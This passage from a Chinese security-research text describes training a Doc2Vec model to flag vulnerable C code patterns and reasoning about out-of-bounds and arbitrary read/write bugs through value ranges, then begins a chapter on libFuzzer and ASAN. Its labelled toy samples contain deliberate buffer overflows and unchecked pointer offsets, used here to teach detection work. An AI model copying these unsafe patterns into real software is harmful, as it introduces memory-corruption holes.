code_sample_white_call_1 = '''
void main() {
    printf(&quot;123123&quot;);
}
'''
code_sample_white_return_1 = '''
int main() {
    int result = 1;

    return result;
}
'''
code_sample_white_add_1 = '''
void main() {
    int a = 1;
    int b = 2;
    int result = 0;

    result = a + b;
}
'''

tranning_sample_code = {
    'memcpy' : [
        # ...
    ] ,
    'overflow' : [
        # ...
    ] ,
    'null_access' : [
        # ...
    ] ,
    'arbitrarily_write' : [
        # ...
    ] ,
    'arbitrarily_read' : [
        # ...
    ] ,
    'white_code' : [
        # ...
    ] ,
}
</code></pre>
<p>经过之前的预处理之后,返回的代码序列如下(演示的Demo 对AST 处理比较粗糙,是导致后面分类出现误差的主要原因):</p>
<pre><code class="language-text">[['variable_define_point:char', 'variable_define_point:char', 'function_call:memcpy']]
[['variable_define_array:char', 'variable_define_array:char', 'function_call:memcpy']]
[['variable_define_point:char', 'variable_define_array:char', 'function_call:memcpy']]
[['variable_define_array:char', 'variable_define_point:char', 'function_call:memcpy']]
[['variable_define_point:char', 'variable_define_point:char', 'function_call:memset', 'function_call:memcpy']]
[['variable_define_array:char', 'variable_define_array:char', 'function_call:memset', 'function_call:memcpy']]
[['variable_define_point:char', 'variable_define_array:char', 'function_call:memset', 'function_call:memcpy']]
[['variable_define_array:char', 'variable_define_point:char', 'function_call:memset', 'function_call:memcpy']]
[['variable_define_array:char']]
[['variable_define_point:char']]
[['variable_define_point:char']]
[['variable_define_point:char']]
[['variable_define_array:char']]
[['variable_define_point:char']]
[['variable_define_point:char', 'variable_define:char']]
[['variable_define_array:char', 'variable_define:char']]
[['variable_define_point:char', 'variable_define:char']]
[['function_call:printf']]
[['function_call:printf', 'function_call:printf', 'function_call:printf', 'function_call:printf', 'function_call:printf']]
[['variable_define:int', 'function_call:printf']]
[['variable_define_array:char', 'function_call:memset', 'function_call:printf']]
[['variable_define_point:char', 'function_call:printf']]
[['variable_define:int', 'CReturnStatement']]
[['variable_define_point:char', 'CReturnStatement']]
[['variable_define_array:char', 'CReturnStatement']]
[['variable_define:int', 'variable_define:int', 'variable_define:int', 'assigment_value:int']]
[['variable_define:int', 'variable_define:int', 'function_call:printf'], ['variable_define:int', 'variable_define:int', 'function_call:printf'], ['variable_defi
ne:int', 'variable_define:int']]
[['variable_define:int', 'function_call:printf']]
</code></pre>
<p>接下来使用Gensim Doc2ver 对样本进行训练,代码如下:</p>
<pre><code class="language-python">TaggededDocument = gensim.models.doc2vec.TaggedDocument

model_tranning_sample_list = []

for tranning_sample_code_type,tranning_sample_code_data_list in tranning_sample_code.items() :
    for tranning_sample_code_data in tranning_sample_code_data_list :
        model_tranning_sample_list.append(TaggededDocument(tranning_sample_code_data, tags = [ tranning_sample_code_type ]))

model = gensim.models.Doc2Vec(model_tranning_sample_list,min_count = 1,window = 3,vector_size = 200,workers = 4)

model.train(model_tranning_sample_list, total_examples = model.corpus_count, epochs=70)
</code></pre>
<p>我们构造一些测试代码,然后使用样本进行识别:</p>
<pre><code class="language-python">code_test_1 = '''
int main(const unsigned char* buffer) {
    unsigned char buffer_l[10] = {0};
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}
'''
# ... Sample code so more that we leave out it .

test_code = [
    make_code(test_sample_code.code_test_1) ,
    # ....
]

for test_code_index in test_code :
    print ' ---- '

    for test_code_flatten_index in test_code_index :
        inferred_vector = model.infer_vector(test_code_flatten_index)

        output.valid_state_output(str(test_code_flatten_index),str(model.docvecs.most_similar([inferred_vector], topn=10)))
</code></pre>
<p>训练样本再分类的效果如下:</p>
<p><img src="pic11/pic19.png" alt="" /></p>
<p>第一部分特征识别的整体难度不大,最困难的一步是要在代码序列中做好预处理,保证特征容易被算法识别而且又不能从AST 精简转化特征的过程中丢掉太多的细节,最后让Doc2Vec 来更准确地对代码序列进行识别.</p>
<p>定位出了可以的代码序列之后,下一步就是要对漏洞进行验证,到这一步骤一定是要使用符号执行来对变量进行取值范围的构建,然后再引入漏洞判断的条件组合起来交由求解器来实现,但是这样就不够&quot;AI&quot; 了.<strong>符号执行的步骤是不能够缺少的,如果没有符号执行,那就无法知道某个特定变量的变化函数与取值范围</strong>.我们常说深度学习的算法都是由样本来拟合出一条回归函数,让回归函数和算法来对数据进行分类计算,那么能不能拟合出这么样的一条曲线呢?漏洞判断的条件能不能推断出一条回归函数呢?下面就绕过符号执行技术直接来探讨这个问题.</p>
<hr />
<h2 id="漏洞验证阶段"><a class="header" href="#漏洞验证阶段">漏洞验证阶段</a></h2>
<h4 id="example-1----单变量与常数值判断"><a class="header" href="#example-1----单变量与常数值判断">Example 1 -- 单变量与常数值判断</a></h4>
<pre><code class="language-c">int calcu(int a) {
    int number = a * a;  // pow(a,2);

    if (number &gt; 100)
        return 1;

    return 0;
}
</code></pre>
<p>calcu() 函数输入输出关系</p>
<p><img src="pic11/pic1.png" alt="pic11/pic1.png" /></p>
<p>我们知道,calcu() 函数是由if 判断来控制不同的return 返回的,那么calcu() 函数的输出因果关系如下(注意,C_100 特指if 判断表达式的右侧常数值100 ;Symblo(x) 则是指if 表达式的左则number 变量的符号表达式number = a*a):</p>
<p><img src="pic11/pic2.png" alt="" /></p>
<p>以(10,100)为交点,左侧黄色虚线勾画的区域是Zero (此时C_100 &gt; Symblo(x)),右侧灰色区域是One (此时Symblo(x) &gt; C_100).Zero 代表函数返回0 ,One 代表函数返回1 .</p>
<p><img src="pic11/pic3.png" alt="" /></p>
<p>所以,函数返回值是0/1 取决于函数Symblo(x) 和直线C_100 的关系.我们回过头来详细分析上述例子if 判断.</p>
<pre><code class="language-c">if (number &gt; 100)
    return 1;

return 0;
//  number = Symblo(x)  ;  C_100 = 100
</code></pre>
<p>那么可知,<strong>当if 要执行到return 1 时,必须要number &gt; 100,就是Symblo(x) &gt; C_100;反之则是number &lt;= 100,也就是Symblo(x) &lt;= C_100)</strong>.基于这个原理,总结如下:</p>
<pre><code class="language-text">Condition_True  =&gt; Symblo(x) Condition_Flag C_?  =&gt; Symblo(x) - C_? Condition_Flag 0
Condition_False =&gt; Symblo(x) !Condition_Flag C_? =&gt; Symblo(x) - C_? Condition_Flag 0

Symblo(x) 指的是number ,Condition_Flag 是指逻辑运算符,C_? 指常数值

例子:

1.if (number == 10086)
Condition_True  =&gt; Symblo(number) == 10086 =&gt; Symblo(number) - 10086 = 0
Condition_False =&gt; Symblo(number) != 10086 =&gt; Symblo(number) - 10086 != 0

2.if (number &lt;= 72)
Condition_True  =&gt; Symblo(number) &lt;= 72 =&gt; Symblo(number) - 72 &lt;= 0
Condition_False =&gt; Symblo(number) &gt; 72  =&gt; Symblo(number) - 72 &gt; 0

</code></pre>
<h4 id="example-2----单变量与单变量判断"><a class="header" href="#example-2----单变量与单变量判断">Example 2 -- 单变量与单变量判断</a></h4>
<pre><code class="language-c">int valid_key(int number) {
    int a = cos(number);
    int b = sin(number);

    if (a / b &gt; number)
        return 1;

    return 1;
}
</code></pre>
<p>calcu() 函数输入输出关系</p>
<p><img src="pic11%5Cpic4.png" alt="" /></p>
<p>calcu() 函数的输出因果关系</p>
<p><img src="pic11/pic5.png" alt="" /></p>
<p>在if 判断这里,我们可知Symblo(a_b) = cos(x)/sin(x) ,Symblo(number) = x .那么这个坐标系的横坐标就是x ,纵坐标就是y (<strong>y = Symblo(x) ,意思是变量经过一系列的运算然后得出的结果,因为是对单个变量进行操作,所以就很容易知道这个变量经过很多次操作之后的具体函数.比如当前示例的calcu() ,有一个传递进来的参数number ,然后我们遍历到分支判断if 时,发现当前if 表达式的左值和右值都是对calcu() 函数的参数number 的值进行引用对比,那么通过符号执行可以推测出if 表达式左值:Symblo(a_b) = a / b = cos(number) / sin(number),右值:Symblo(number) = number</strong>).黄色虚线区域代表Condition True ,灰色代表Condition False .使用上一个示例的总结,我们可以知道:</p>
<pre><code class="language-text">Conditon_True  =&gt; Symblo(a_b) &gt;  Symblo(number) =&gt; cos(number) / sin(number) &gt;  number =&gt; cot(number) &gt;  number =&gt; cot(number) - number &gt;  0
Conditon_False =&gt; Symblo(a_b) &lt;= Symblo(number) =&gt; cos(number) / sin(number) &lt;= number =&gt; cot(number) &lt;= number =&gt; cot(number) - number &lt;= 0
</code></pre>
<p>事实上,我们所列出的Condition_True 和Condition_False ,实际上指的是一个取值范围(Value_Range),<strong>当变量值出现在某个区域时,我们就认为它属于True / False</strong> .所以,也可以说是Condition_True_Range ,Condition_False_Range .</p>
<h4 id="example-3----单变量与常数值多次判断"><a class="header" href="#example-3----单变量与常数值多次判断">Example 3 -- 单变量与常数值多次判断</a></h4>
<pre><code class="language-c">int calcu(int number) {
    int result = pow(number,2);

    if (result &gt; 100)
        return 2;
    else if (result &gt; 25)
        return 1;

    return 0;
}
</code></pre>
<p>calcu() 函数输入输出关系</p>
<p><img src="pic11/pic6.png" alt="" /></p>
<p>calcu() 函数的输出因果关系</p>
<p><img src="pic11/pic7.png" alt="" /></p>
<p>我们分析上述两个if 判断.判断1: result &gt; 100 ,满足符合条件的区域为Symblo(number) &gt; 100 ,对应上图紫色区域;判断2: result &gt; 25 &amp;&amp; result &lt;=100 (注意,<strong>result &lt;= 100 是隐含条件,在这个else if 前面还有一个先决条件,所以不能忽略这个result &lt;=100 这个表达式</strong>),满足符合条件的区域为**Symblo(number) &lt;= 100 ∩ Symblo(number) &gt; 25  &lt;=&gt;  x^2 &lt;= 100 ∩ x^2 &gt; 25 <strong>,对应上图黄色区域;最后的return 0 对应上述的两个先决条件:1.result&lt;=100 ;2.result&lt;=25 ,合并起来就是</strong>result &lt;= 100 &amp;&amp; result &lt;= 25  &lt;=&gt;  Symblo(number) &lt;= 25 &amp;&amp; Symblo(number) &lt;= 100  &lt;=&gt;  Symblo(number) &lt;= 25 **,对应上图橙色区域.总结如下:</p>
<pre><code class="language-text">Condition_Express_1 &amp;&amp; Condition_Express_2 =&gt; Condition_True_Range_1 ∩ Condition_True_Range_2 (&amp;&amp; 是逻辑And )
Condition_Express_1 || Condition_Express_2 =&gt; Condition_True_Range_1 ∪ Condition_True_Range_2 (|| 是逻辑Or )
</code></pre>
<p><strong>变量经过多次赋值和运算,那么它的值一定能够可以通过一条函数表达式来计算的(参考符号执行原理,通过变量间的赋值与计算关系推导出结果).那么if 判断的实质就是要限制变量的取值范围,所以Symblo(x) 是变量结果的计算函数,Condition_Range 则是变量的取值范围</strong></p>
<h4 id="example-4----多变量引用与单次判断"><a class="header" href="#example-4----多变量引用与单次判断">Example 4 -- 多变量引用与单次判断</a></h4>
<pre><code class="language-c">int calcu(int a,int b) {
    if (a &gt; b)
    	return 1;

    return 0;
}
</code></pre>
<p>calcu() 函数的输出因果关系</p>
<p><img src="pic11/pic8.png" alt="" /></p>
<p>首先,calcu() 函数引入了两个变量,在if 判断这里引用两个变量a 和b ,因为a 与b 的值关系最终决定了y (返回值)的值,所以这就需要构造三维坐标系.于是Condition_True_Range &lt;=&gt; Symblo(a) &gt; Symblo(b) .当a = b 相等时,我们可以在a b 的二维平面上勾画出一条直线,f(b) =  b .那么当a &gt; b 时,也就是在One 区域;当b &lt; a 时,那就在Zero 区域.</p>
<h4 id="example-5----数组引用"><a class="header" href="#example-5----数组引用">Example 5 -- 数组引用</a></h4>
<pre><code class="language-c">void access(int index) {
    char buffer[10] = {0};

    buffer[index] = 'A';
}
</code></pre>
<p>现在我们要研究的是index 与buffer 变量的关系.我们在写白盒审计工具时,如果要对代码<code>buffer[index] = 'A';</code> 漏洞校验时,如果index &gt;= sizeof(buffer) 那就认为这行代码存在越界漏洞,我们把index 变量的关系和buffer 这么来处理.先来看看index 变量与buffer 索引之间的关系函数.</p>
<p><img src="pic11/pic11.png" alt="" /></p>
<p>可以知道,这是一个<code>buffer_index = Symblo(index) = index</code>,横坐标是index 变量,纵坐标是buffer_index .再看看看其它例子:</p>
<pre><code class="language-c">void access(int index) {
    char buffer[10] = {0};

    buffer[index + 2] = 'A';
}
</code></pre>
<p>此时index 变量与buffer 索引之间的关系函数为<code>buffer_index = Symblo(index) = index + 2</code>.</p>
<p><img src="pic11/pic12.png" alt="" /></p>
<pre><code class="language-c">void access(int index) {
    char buffer[10] = {0};

    buffer[index &amp; 8] = 'A';
}
</code></pre>
<p>此时index 变量与buffer 索引之间的关系函数为<code>buffer_index = Symblo(index) = index &amp; 8</code>.因为引入了逻辑运算,其实上也可以通过坐标系画出Symblo(index) 的函数曲线的,图像如下.</p>
<p><img src="pic11/pic13.png" alt="" /></p>
<p>回过头来继续深入数组访问的第一个示例程序,我们把buffer_size (由<code>char buffer[10]={0}</code> 可知buffer_size = (x = 10))也引入到坐标系中,得到下图:</p>
<p><img src="pic11/pic14.png" alt="" /></p>
<p>在此我们分为两条函数:Symblo(buffer_size) 和Symblo(index) ,两条函数相交于(10,10) .那么有:<strong>1.Symblo(buffer_size) &gt; Symblo(index) 意味着对这个数组的访问是正常的; 2.Symblo(buffer_size) &lt; Symblo(index) 意味着访问这个数组是异常的(越界访问)</strong> .所以我们就需要对<strong>变量index 的取值范围进行限制</strong>,示例代码修改如下:</p>
<pre><code class="language-c">void access(int index) {
    char buffer[10] = {0};

    if (index &lt; sizeof(buffer))
    	buffer[index] = 'A';
}
</code></pre>
<p>现在我们引入了if 判断,对变量index 的取值范围进行了限制(x = 10),对应图像如下:</p>
<p><img src="pic11/pic15.png" alt="" /></p>
<p>橙色区域是合法的buffer 引用范围,红色区域是buffer 引用越界的范围.<strong>横坐标的index 经过一系列的运算(Symblo(index)) 最后得出纵坐标buffer_index 的值;而且,对index 所做的if 校验,实际上都是对index 的范围进行限制,只有Symblo(index) 在符合index 的取值范围内能够让buffer_index 的值大于10 才能导致的越界,所以就把y = 10 表示为漏洞边界表达式,只要存在越过这一边界的值,那么就存在越界漏洞.</strong></p>
<h4 id="example-6----任意地址读写漏洞分析"><a class="header" href="#example-6----任意地址读写漏洞分析">Example 6 -- 任意地址读写漏洞分析</a></h4>
<pre><code class="language-c">int resolve_buffer(int* recv_buffer) {
    int offset = recv_buffer[1];

    return *(recv_buffer + offset);
}
</code></pre>
<p>代码语句*(recv_buffer + offset) 的意思是要获取这个地址中的内容.一般来说,recv_buffer 是一个特定的内存地址(一个固定的常数值),offset 则是一个变量值(因为是来自用户输入),那么最后**读取的地址函数式与recv_buffer ,offset 对应的关系为address = Symblo(offset) &lt;=&gt; recv_buffer + offset &lt;=&gt; C_recv_buffer + offset.**对应的变化关系图如下,横坐标为offset ,纵坐标为address :</p>
<p><img src="pic11/pic16.gif" alt="" /></p>
<p>我们知道,C_recv_buffer 是一个正整数常数(0 &lt;= C_recv_buffer &lt;= max(int)),offset 则是一个变量,接下来对offset 的长度进行校验,代码如下:</p>
<pre><code class="language-c">int resolve_buffer(int* recv_buffer) {
    int offset = recv_buffer[1];

    if (offset &lt; 20)
    	return *(recv_buffer + offset);

    return 0;
}
</code></pre>
<p>对应的关系图如下:</p>
<p><img src="pic11/pic17.png" alt="" /></p>
<p>在此我们假设C_recv_buffer 的值为25 ,offset 是变量,但是被约束offset &lt; 20 ,那么橙色区域是合法的访问区域,红色区域则是不合法的访问区域,因为offset 是int 类型,可以取值为负数,那么久可以越过recv_buffer 的合法读取往前读取地址空间小于20 的位置.</p>
<p><img src="pic11/pic18.png" alt="" /></p>
<p>所以我们分析这个图形,漏洞的边界函数有两个,分别是C_recv_buffer_lower_bound = 25 与C_recv_buffer_upper_bound = 45 .只有<strong>C_recv_buffer_lower_bound  &lt;= address &lt; C_recv_buffer_upper_bound</strong> 时访问数组才是合法的.</p>
<p>实际上,我们在用Symblo Executge (符号执行)和Coverage (代码覆盖率)就是为了不断探索出if 判断对于变量所设定的取值范围.对变量每增多一个if 判断,那么取值范围就会相应地减小.</p>
<h4 id="取值范围与函数相交"><a class="header" href="#取值范围与函数相交">取值范围与函数相交</a></h4>
<p>下面是一个函数C1 穿过一个数据集R1 的例子.</p>
<p><img src="pic11/pic9.png" alt="" /></p>
<p>我们假设R1 是某个变量的取值范围,C1 是边界函数.<strong>使用机器学习的思想,边界函数C1 根据数据出现在边界函数的左右两则位置而确定数据的分类,我们只需要给定数据,那么就可以拟合出边界函数C1 的曲线,然后给数据进行分类</strong>.<em>那么我们能不能通过对这些数据集进行分类进而确定是否存在漏洞呢?</em></p>
<h5 id="曲线拟合"><a class="header" href="#曲线拟合">曲线拟合</a></h5>
<p>我们知道,对一些已经打好分类标签的数据集再传递给模型学习,那么模型就能够拟合出一条曲线C(x) ,如下图:</p>
<p><img src="pic11/pic10.png" alt="" /></p>
<p>但是,<strong>对于某种特定的漏洞检验函数,它是唯一的</strong>.比如说:任意地址写对应的检验函数为C(x) = x ;数组越界检验函数为C_upper(buffer) = C1 ,C_lower(buffer) = C2 .这些漏洞边界函数都是较为<strong>固定</strong>的,并不是像需要依靠分类的样本数据使用算法来拟合出的边界函数,<strong>漏洞的产生存在因果关系,而不是相关性</strong>.</p>
<h4 id="漏洞样本检验"><a class="header" href="#漏洞样本检验">漏洞样本检验</a></h4>
<p>我们研究一下样本代码,看看能不能发现些什么.</p>
<pre><code class="language-c">//  Buffer Overflow

code_sample_buffer_check_1 = '''
void main() {
    char buffer[10] = {0};

    buffer[10] = '\0';
}
'''
code_sample_buffer_check_2 = '''
void main() {
    char* buffer = (char*)malloc(10);

    buffer[20] = '\0';
}
'''
</code></pre>
<p>前面已经说过,漏洞之所以会产生,那是因为buffer_size 和buffer_index 的关系.**因为只有buffer_index &gt; buffer_size 时,才导致了buffer 访问溢出.**我们使用ASAN ,Gflags 的目的就是要挖掘出来这两者之间的关系(通过代码插桩或者内存读写权限控制实现越界检测).对于code_sample_buffer_check_1 来说,buffer 大小是显式表达的(变量语句中已经声明了buffer 大小为10 );code_sample_buffer_check_2 则是隐式表达的(因为是通过malloc 分配指定,大部分情况下不容易确定它具体的值).</p>
<pre><code class="language-c">//  Arbitrarily_Write

code_sample_arbitrarily_write_check_1 = '''
void main(char* point) {
    char* buffer = point;

    *buffer = 0x1;
}
'''
code_sample_arbitrarily_write_check_2 = '''
void main(char* offset) {
    char buffer[10] = {0};

    *(buffer + offset) = 0x1;
}
'''
code_sample_arbitrarily_read_check_1 = '''
void main(char* point) {
    char* buffer = point;
    char  data = *buffer;
}
'''
code_sample_arbitrarily_read_check_2 = '''
void main(char* offset) {
    char buffer[10] = {0};
    char data = *(buffer + offset);
}
'''
</code></pre>
<p>任意地址读写也是一样的,对于buffer 的边界还是需要上下文来推断,offset 的变化函数容易推算出来,但是buffer 的边界函数却不容易推算.</p>
<h4 id="总结"><a class="header" href="#总结">总结</a></h4>
<p>漏洞验证阶段是最头疼的,**验证一个漏洞是否有效,本质上是对变量的取值范围与漏洞边界进行探讨.通过上述的一些讨论发现如果要使用AI 的算法去拟合出漏洞边界函数其实是不现实的,因为这些边界函数是根据相关变量动态变化的,倒不如让我们把所有的限制条件和变量初值设置好让求解器来运算.**博主太菜了,他真的没有办法了,写到这里的时候,不知不觉留下了没有技术的泪水...</p>
<p>那么因果推断能用上来吗? https://zhuanlan.zhihu.com/p/33860572</p>
<p><img src="pic11/pic22.png" alt="" /></p>
<p>在线函数画图URL</p>
<p>https://zh.numberempire.com/graphingcalculator.php</p>
<p>https://www.desmos.com/calculator</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="3-深入解析libfuzzer与asan"><a class="header" href="#3-深入解析libfuzzer与asan">3. 深入解析libfuzzer与asan</a></h1>
<ul>
<li><a href="12.libfuzzer-asan.html#llvm%E4%B8%8B%E7%9A%84%E6%8F%92%E6%A1%A9%E7%AE%80%E8%BF%B0">LLVM下的插桩简述</a></li>
<li><a href="12.libfuzzer-asan.html#%E7%8E%A9%E8%BD%ACsanitizer-coverage">玩转Sanitizer-Coverage</a>
<ul>
<li><a href="12.libfuzzer-asan.html#sanitizer-coverage%E5%88%9D%E4%BD%93%E9%AA%8C">Sanitizer-Coverage初体验</a></li>
<li><a href="12.libfuzzer-asan.html#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87demo">一个简单的代码覆盖率Demo</a></li>
<li><a href="12.libfuzzer-asan.html#%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2sanitizer-coverage%E5%AE%9E%E7%8E%B0">深入探索Sanitizer-Coverage实现</a></li>
<li><a href="12.libfuzzer-asan.html#llvm-pass-for-sanitizercoveragecpp%E5%AE%9E%E7%8E%B0%E7%BB%86%E8%8A%82">LLVM Pass for SanitizerCoverage.cpp实现细节</a></li>
<li><a href="12.libfuzzer-asan.html#%E5%AE%9A%E5%88%B6sanitizercoverage">定制SanitizerCoverage</a></li>
</ul>
</li>
<li><a href="12.libfuzzer-asan.html#libfuzzer%E5%8E%9F%E7%90%86">libFuzzer原理</a>
<ul>
<li><a href="12.libfuzzer-asan.html#libfuzzer%E6%89%A7%E8%A1%8Cfuzzer%E8%BF%87%E7%A8%8B">libFuzzer执行Fuzzer过程</a></li>
<li><a href="12.libfuzzer-asan.html#%E6%95%B0%E6%8D%AE%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86">数据生成原理</a></li>
<li><a href="12.libfuzzer-asan.html#%E8%B7%AF%E5%BE%84%E6%8E%A2%E6%B5%8B%E5%8E%9F%E7%90%86">路径探测原理</a></li>
</ul>
</li>
<li><a href="12.libfuzzer-asan.html#%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E5%8F%82%E6%95%B0%E4%B8%8E%E5%9B%9E%E6%98%BE">深入解析libFuzzer参数与回显</a>
<ul>
<li><a href="12.libfuzzer-asan.html#%E7%BC%96%E8%AF%91%E6%97%B6%E4%BD%BF%E7%94%A8-libfuzzera%E5%92%8C-fsanitizefuzzer%E6%9C%89%E5%8C%BA%E5%88%AB%E5%98%9B">编译时使用 libFuzzer.a和-fsanitize=fuzzer有区别嘛?</a></li>
<li><a href="12.libfuzzer-asan.html#%E4%B8%BA%E4%BB%80%E4%B9%88libfuzzer%E8%A6%81%E5%88%A0%E9%99%A4%E5%AF%B9trace-pc%E7%9A%84%E6%94%AF%E6%8C%81">为什么libFuzzer要删除对trace-pc的支持?</a></li>
<li><a href="12.libfuzzer-asan.html#windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E6%80%8E%E4%B9%88%E5%BC%95%E7%94%A8libfuzzer">Windows平台下怎么引用libFuzzer?</a></li>
<li><a href="12.libfuzzer-asan.html#libfuzzer%E6%80%8E%E4%B9%88%E6%A0%B7%E6%8F%90%E9%AB%98%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C">libFuzzer怎么样提高模糊测试效果?</a></li>
<li><a href="12.libfuzzer-asan.html#%E5%A4%9A%E4%B8%AAlibfuzzer%E5%90%8C%E6%97%B6%E5%90%AF%E5%8A%A8%E6%97%B6%E6%80%8E%E4%B9%88%E6%A0%B7%E5%8C%BA%E5%88%86%E4%B8%8D%E5%90%8C%E7%9A%84libfuzzer%E7%94%9F%E6%88%90%E7%9A%84crash">多个libFuzzer同时启动时,怎么样区分不同的libFuzzer生成的Crash?</a></li>
<li><a href="12.libfuzzer-asan.html#%E4%BE%9D%E8%B5%96%E5%BA%93%E6%B2%A1%E6%9C%89%E6%BA%90%E7%A0%81%E6%97%B6%E6%9C%89%E6%B2%A1%E6%9C%89%E5%BF%85%E8%A6%81%E4%BD%BF%E7%94%A8libfuzzer">依赖库没有源码时有没有必要使用libFuzzer?</a></li>
<li><a href="12.libfuzzer-asan.html#%E5%A6%82%E4%BD%95%E5%B9%B6%E8%A1%8C%E6%89%A7%E8%A1%8C%E5%A4%9A%E4%B8%AAlibfuzzer">如何并行执行多个libFuzzer?</a></li>
<li><a href="12.libfuzzer-asan.html#libfuzzer%E8%BE%93%E5%87%BA%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF%E6%80%8E%E4%B9%88%E6%A0%B7%E6%A0%B9%E6%8D%AE%E8%BF%99%E4%BA%9B%E4%BF%A1%E6%81%AF%E4%BC%98%E5%8C%96fuzzer">libFuzzer输出哪些信息,怎么样根据这些信息优化Fuzzer?</a></li>
</ul>
</li>
<li><a href="12.libfuzzer-asan.html#asan%E5%8E%9F%E7%90%86">ASAN原理</a>
<ul>
<li><a href="12.libfuzzer-asan.html#asan%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86">ASAN异常检测原理</a></li>
<li><a href="12.libfuzzer-asan.html#%E7%BC%96%E8%AF%91%E6%97%B6%E6%8F%92%E6%A1%A9%E5%8E%9F%E7%90%86">编译时插桩原理</a></li>
<li><a href="12.libfuzzer-asan.html#llvm-compilerrt%E4%B8%8Easan%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0">LLVM-CompilerRT与ASAN内置函数</a></li>
<li><a href="12.libfuzzer-asan.html#asan%E6%A3%80%E6%B5%8B%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84bug">ASAN检测结构体的Bug</a></li>
</ul>
</li>
<li><a href="12.libfuzzer-asan.html#%E5%AE%9E%E6%88%98%E4%B8%ADasan%E4%BC%9A%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9D%91">实战中ASAN会有哪些坑</a>
<ul>
<li><a href="12.libfuzzer-asan.html#libasan%E5%BA%93%E7%BC%BA%E5%A4%B1%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3">libasan库缺失如何解决?</a></li>
<li><a href="12.libfuzzer-asan.html#%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B8%AD%E9%81%87%E5%88%B0%E8%80%81%E6%97%A7%E4%B8%8D%E7%BB%B4%E6%8A%A4%E7%9A%84%E5%BA%93%E4%B8%80%E7%9B%B4%E4%BA%A7%E7%94%9F%E5%B4%A9%E6%BA%83%E6%80%8E%E4%B9%88%E6%A0%B7%E8%AE%A9asan%E5%B1%8F%E8%94%BD%E5%AF%B9%E5%AE%83%E7%9A%84%E6%A3%80%E6%B5%8B">模糊测试中遇到老旧不维护的库一直产生崩溃,怎么样让ASAN屏蔽对它的检测?</a></li>
<li><a href="12.libfuzzer-asan.html#asan%E6%9C%89%E5%93%AA%E4%BA%9B%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE">ASAN有哪些常用设置?</a></li>
<li><a href="12.libfuzzer-asan.html#shadow-table%E5%86%85%E5%AD%98%E7%B2%92%E5%BA%A6%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89">Shadow Table内存粒度有什么意义?</a></li>
<li><a href="12.libfuzzer-asan.html#%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E4%BD%BF%E7%94%A8asan%E7%9A%84%E7%A8%8B%E5%BA%8F">如何调试使用ASAN的程序?</a></li>
<li><a href="12.libfuzzer-asan.html#x64-asan%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%85%BC%E5%AE%B9">x64 ASAN为什么不兼容?</a></li>
<li><a href="12.libfuzzer-asan.html#asan-for-windows%E4%BD%BF%E7%94%A8msvc%E8%BF%98%E6%98%AFllvm">ASAN for Windows使用MSVC还是LLVM?</a></li>
<li><a href="12.libfuzzer-asan.html#%E4%B8%BB%E7%A8%8B%E5%BA%8F%E5%92%8C%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E7%9A%84asan%E5%85%BC%E5%AE%B9%E5%90%97">主程序和动态链接库的ASAN兼容吗?</a></li>
</ul>
</li>
<li><a href="12.libfuzzer-asan.html#%E5%8F%82%E8%80%83%E5%BC%95%E7%94%A8">参考引用</a></li>
</ul>
<h2 id="llvm下的插桩简述"><a class="header" href="#llvm下的插桩简述">LLVM下的插桩简述</a></h2>
<p>关于LLVM的编译过程网上已经有很多的分析,在此挑选出与本文相关的地方做简单的复述:</p>
<ol>
<li>LLVM前端把代码序列化为AST树,编译成LLVM IR.</li>
<li>编译为LLVM IR后,通过各个模块(Pass)进行分析,优化与插桩.</li>
<li>编译为目标平台二进制字节码.</li>
<li>符号链接,生成可执行文件.</li>
</ol>
<p><img src="./pic12/Compile-time-instrumentation-flow-in-LLVM.png" alt="" /></p>
<p>本文要讨论的插桩技术包含Sanitizer-Coverage和ASAN,它们在LLVM中分别存在于Pass和Compiler-RT中.简单地说,Pass提供插桩的功能,Compiler-RT中提供了运行时支持的内部接口函数,下面从最容易入手的Sanitizer-Coverage开始实现代码覆盖率的统计.</p>
<h2 id="玩转sanitizer-coverage"><a class="header" href="#玩转sanitizer-coverage">玩转Sanitizer-Coverage</a></h2>
<h4 id="sanitizer-coverage初体验"><a class="header" href="#sanitizer-coverage初体验">Sanitizer-Coverage初体验</a></h4>
<p>接触过二进制Fuzzing的朋友们应该知道,代码覆盖率的用意是了解当前的模糊测试方式与用例触发程序执行的代码占整体代码的百分比,这个比值越高,越说明有很多的代码分支和函数被执行到,能够挖掘到隐藏在代码的漏洞的概率就更大.</p>
<p>下面是一段简单的测试代码:</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;

int function1(int a) {
    if (1 == a)
        return 0;

    return 1;
}

int function2() {
    return -1;
}

int main() {
    if (rand() % 2)
        function1(rand() % 3);
    else
        function2();

    return 0;
}
</code></pre>
